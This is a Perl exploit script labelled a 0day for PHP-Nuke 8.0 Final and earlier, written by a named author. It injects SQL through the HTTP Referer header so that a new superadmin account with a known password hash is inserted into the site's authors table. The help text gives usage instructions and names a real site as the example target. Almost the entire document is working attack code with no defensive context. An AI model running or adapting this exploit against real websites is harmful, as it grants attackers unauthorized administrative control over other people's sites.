#!/usr/bin/perl 
#0day exploit for PHP-nuke <=8.0 Final
#Sql injection attack in INSERT syntax
#version for every base(PostgreSQL,mssql...) except MySQL base
#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
#Screenshot:
#0day exploit for PHP-nuke <=8.0 Final
#Sql injection attack in INSERT syntax
#version for every base(PostgreSQL,mssql...) except MySQL base
#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
#
#[+]I registered new superadmin
#[+]You can login at http://blackshell.pl/~krasza/nuke/html/index.php 
#[+]Login:krasza
#[+]Password:krasza
#[+]Exploit successed
use strict;
use warnings;
use LWP;
my $adres=shift or help();
my $ua = LWP::UserAgent->new;
my $zadanie = HTTP::Request->new(GET => $adres);
my ($respone,$referer);
banner();
	$referer="http://www.krasza.int.pl');INSERT INTO `nuke_authors` VALUES ('krasza', 'God', 'http://www.krasza.int.pl', 'krasza\@gmail.com', '61af1f6e572d7fe3a72f54a6ac53830e', '0', '1', '";
	$zadanie->referer($referer);
	$respone=$ua->request($zadanie);
	$respone->is_success or die "$adres : ",$respone->message,"\n";
	print "[+]I registered new superadmin\n";
	print "[+]You can login at $adres \n";
	print "[+]Login:krasza\n";
	print "[+]Password:krasza\n";
	print "[+]Exploit successed\n";
sub banner{
	print "0day exploit for PHP-nuke <=8.0 Final\n";
        print "Sql injection attack in INSERT syntax\n";
	print "version for every base(PostgreSQL,mssql...) except MySQL base\n";
        print "Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n\n";
}
sub help{
	print "0day exploit for PHP-nuke <=8.0 Final\n";
	print "Sql injection attack in INSERT syntax\n";
	print "version for every base(PostgreSQL,mssql...) except MySQL base\n";
	print "Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n";
	print "Use:\n";
	print "\tperl exploit.pl [url]\n";
	print "\t[url]-vicitim webpage with index.php\n";
	print "Example:\n";
	print "\tperl exploit.pl http://phpnuke.org/index.php\n";
	exit(0);
}
